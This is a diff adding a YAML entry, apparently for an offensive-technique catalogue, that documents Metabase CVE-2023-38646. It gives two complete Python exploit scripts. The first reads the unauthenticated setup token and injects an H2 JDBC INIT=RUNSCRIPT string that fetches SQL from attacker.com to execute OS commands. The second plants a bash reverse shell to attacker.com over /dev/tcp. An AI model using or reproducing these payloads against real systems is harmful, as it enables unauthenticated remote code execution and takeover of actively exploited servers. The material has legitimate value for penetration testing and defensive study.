@@ -1,0 +1,105 @@
+---
+comment: |
+  Metabase is an open-source business intelligence and analytics platform.
+  CVE-2023-38646 is a pre-authentication RCE via the /api/setup/validate endpoint,
+  which accepts a JDBC connection string and passes it to the H2 database driver
+  without sanitization. The H2 INIT parameter allows executing arbitrary SQL,
+  including CREATE ALIAS (Java method binding), to run OS commands.
+
+  The setup-token required to access the endpoint is publicly readable at
+  /api/session/properties with no authentication.
+
+  Affects Metabase open source < 0.46.6.1 and Enterprise < 1.46.6.1.
+  Listed in the CISA KEV catalog; actively exploited in the wild.
+functions:
+  rce:
+  - blind: true
+    code: |
+      #!/usr/bin/env python3
+      # Step 1: host rce.sql on the attacker machine (python3 -m http.server 8888)
+      # rce.sql content:
+      #   CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String[] c)
+      #   throws Exception { Runtime.getRuntime().exec(c); return null; }$$;
+      #   CALL EXEC(ARRAY['/bin/sh', '-c', 'id > /tmp/pwned']);
+
+      import requests
+
+      BASE = "http://victim.com"
+      RCE_SQL_URL = "http://attacker.com:8888/rce.sql"
+
+      # Retrieve the setup token (no auth required)
+      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]
+
+      # Trigger the exploit via H2 JDBC INIT=RUNSCRIPT
+      jdbc = (
+          "zip:./metabase.jar!/sample-database.db"
+          ";TRACE_LEVEL_SYSTEM_OUT=3"
+          f";INIT=RUNSCRIPT FROM '{RCE_SQL_URL}'"
+      )
+      resp = requests.post(f"{BASE}/api/setup/validate", json={
+          "token": token,
+          "details": {
+              "is_full_sync": True,
+              "is_on_demand": False,
+              "name": "x",
+              "engine": "h2",
+              "details": {"db": jdbc}
+          }
+      })
+      print(resp.text)
+    comment: "CVE-2023-38646: the H2 INIT parameter in the JDBC URL is executed as\
+      \ SQL during\nconnection setup. RUNSCRIPT FROM fetches and executes a remote\
+      \ SQL file, which\nuses CREATE ALIAS to bind a Java method and execute OS commands.\n\
+      \nThe zip: URI points to the H2 sample database bundled inside metabase.jar,\n\
+      avoiding the need to reference an external database file.\n\nrce.sql must be\
+      \ hosted on a server reachable from the Metabase host. Command\noutput is not\
+      \ returned in the HTTP response \u2014 write output to a file or use the\nreverse\
+      \ shell entry for interactive access.\n\nRef: https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      open source < 0.46.6.1 / Enterprise < 1.46.6.1
+  reverse-shell:
+  - blind: true
+    code: |
+      #!/usr/bin/env python3
+      # Host rev.sql on the attacker machine (python3 -m http.server 8888)
+      # rev.sql content:
+      #   CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String[] c)
+      #   throws Exception { Runtime.getRuntime().exec(c); return null; }$$;
+      #   CALL EXEC(ARRAY['/bin/bash', '-c',
+      #     'bash -i >& /dev/tcp/attacker.com/12345 0>&1']);
+
+      import requests
+
+      BASE = "http://victim.com"
+      REV_SQL_URL = "http://attacker.com:8888/rev.sql"
+
+      token = requests.get(f"{BASE}/api/session/properties").json()["setup-token"]
+
+      jdbc = (
+          "zip:./metabase.jar!/sample-database.db"
+          ";TRACE_LEVEL_SYSTEM_OUT=3"
+          f";INIT=RUNSCRIPT FROM '{REV_SQL_URL}'"
+      )
+      requests.post(f"{BASE}/api/setup/validate", json={
+          "token": token,
+          "details": {
+              "is_full_sync": True,
+              "is_on_demand": False,
+              "name": "x",
+              "engine": "h2",
+              "details": {"db": jdbc}
+          }
+      })
+    comment: |
+      CVE-2023-38646: spawns a reverse bash shell via H2 JDBC Java method injection.
+      The shell runs as the Metabase process user (commonly metabase or root in containers).
+      The SQL file must be reachable from the Metabase host over HTTP.
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    tty: false
+    version: |-
+      open source < 0.46.6.1 / Enterprise < 1.46.6.1
+...
